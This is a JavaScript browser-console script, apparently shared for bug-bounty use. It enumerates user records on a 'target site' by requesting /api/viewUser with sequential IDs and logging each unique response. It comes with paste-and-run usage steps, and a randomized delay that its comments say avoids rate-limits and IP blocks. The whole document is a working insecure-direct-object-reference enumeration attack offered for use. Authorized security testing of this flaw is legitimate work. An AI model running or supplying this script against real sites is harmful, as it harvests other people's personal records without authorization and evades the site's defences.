// Enumerate user records by iterating over sequential IDs
// logging the responses to the browser console.
// with error handling and rate limiting
// Usage:
//   On the target site's tab, Press F12 → go to Console, Paste the script → hit Enter
// Credits: https://ztw.ctbb.show/slides.html#16

(async () => {
    const base = window.location.origin + '/api/viewUser';  // ← adjust if needed

    const seen = new Set();
    let consecutiveFailures = 0;
    const STOP_AFTER_N_CONSECUTIVE_FAILURES = 10;   // ← tune this number

    console.log("Starting scan... (will stop after " + STOP_AFTER_N_CONSECUTIVE_FAILURES + " consecutive non-successful responses)");

    for (let i = 0; i < 20000; i++) {   // high safety limit
        try {
            const res = await fetch(`${base}?id=${i}`);

            if (!res.ok) {
                consecutiveFailures++;
                if (consecutiveFailures >= STOP_AFTER_N_CONSECUTIVE_FAILURES) {
                    console.log(
                        `\n└─ Stopping: ${consecutiveFailures} consecutive non-200 responses ` +
                        `(last successful was around id ${i - consecutiveFailures - 1 || 'none'})`
                    );
                    break;
                }
                // optional: show progress every 10 failures
                if (consecutiveFailures % 10 === 0 && consecutiveFailures > 0) {
                    console.log(`  → ${consecutiveFailures} consecutive failures so far (id=${i})`);
                }
                continue;
            }

            // reset counter when we get any 2xx response
            consecutiveFailures = 0;

            const body = await res.text();

            if (body.length <= 50) continue;

            // You can experiment with better signatures:
            //   const signature = body;                                 // exact match (slow + memory heavy)
            //   const signature = JSON.parse(body)?.id ?? body.slice(0,600);
            const signature = body.slice(0, 400) + `__len_${body.length}`;

            if (seen.has(signature)) continue;

            seen.add(signature);

            console.log(`New interesting response  [id=${i}]  (size ${body.length})`);
            console.log(body.slice(0, 320) + (body.length > 320 ? '…' : ''));
            console.log('─'.repeat(70));

        } catch (err) {
            // network error, CORS, timeout, aborted, etc.
            consecutiveFailures++;
            if (consecutiveFailures >= STOP_AFTER_N_CONSECUTIVE_FAILURES) {
                console.log(`\n└─ Stopping: ${consecutiveFailures} consecutive errors (network/CORS/etc)`);
                break;
            }
        }

        // polite delay — helps avoid rate-limits / IP blocks
        await new Promise(r => setTimeout(r, 350 + Math.random() * 250));
    }

    console.log(`\nFinished — found ${seen.size} unique meaningful responses`);
})();


